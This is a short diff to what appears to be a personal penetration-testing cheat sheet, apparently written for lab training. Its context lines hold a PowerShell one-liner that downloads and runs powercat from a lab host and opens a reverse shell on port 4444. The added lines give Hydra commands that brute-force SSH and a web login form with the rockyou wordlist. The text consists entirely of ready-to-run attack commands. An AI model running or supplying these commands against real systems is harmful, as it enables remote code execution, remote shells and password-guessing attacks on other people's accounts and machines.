@@ -87,3 +87,11 @@ Execution Policy on Windows:
 Download and execute in PowerShell:
 
     IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
+
+
+Password Shit:
+        Hydra:
+
+            hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.211.202
+            hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
+            
